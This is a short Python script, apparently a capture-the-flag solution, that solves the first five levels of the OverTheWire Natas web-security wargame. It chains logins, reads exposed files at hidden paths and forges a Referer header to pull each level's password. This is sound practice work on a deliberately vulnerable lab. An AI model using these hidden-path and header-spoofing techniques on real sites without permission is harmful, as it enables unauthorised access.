#!/bin/python3
# @author: YrnCollo

'''importing modules'''
import re
import requests


def natas0():
    '''function to solve natas0 '''
    username = 'natas0'
    password = 'natas0'
    url = f"http://{username}.natas.labs.overthewire.org"

    webpage = requests.post(url, auth=(username, password))

    results = re.findall(r'[a-zA-Z0-9]{32}', webpage.text)
    return results[0]


def natas1():
    '''function to solve natas1'''
    username = "natas1"
    password = natas0()

    url = f"http://{username}.natas.labs.overthewire.org"

    webpage = requests.post(url, auth=(username, password))
    results = re.findall(r'[a-zA-Z0-9]{32}', webpage.text)
    return results[1]


def natas2():
    '''this is to solve natas2'''
    username = 'natas2'
    password = natas1()
    url = f"http://{username}.natas.labs.overthewire.org/files/users.txt"

    webpage = requests.post(url, auth=(username, password))
    results = re.findall(r'[a-zA-Z0-9]{32}', webpage.text)
    return results[0]


def natas3():
    ''' this is to solve natas3'''
    username = 'natas3'
    password = natas2()
    url = f"http://{username}.natas.labs.overthewire.org/s3cr3t/users.txt"

    webpage = requests.post(url, auth=(username, password))
    results = re.findall(r'[a-zA-Z0-9]{32}', webpage.text)
    return results[0]


def natas4():
    '''to solve natas4'''
    username = 'natas4'
    password = natas3()
    url = f"http://{username}.natas.labs.overthewire.org/"
    headers = {"Referer": "http://natas5.natas.labs.overthewire.org/"}
    session = requests.Session()

    webpage = session.get(url, auth=(username, password), headers=headers)
    results = re.findall(r'[a-zA-Z0-9]{32}', webpage.text)
    return results[1]


if __name__ == '__main__':
    natas0()
    natas1()
    natas2()
    natas3()
    natas4()
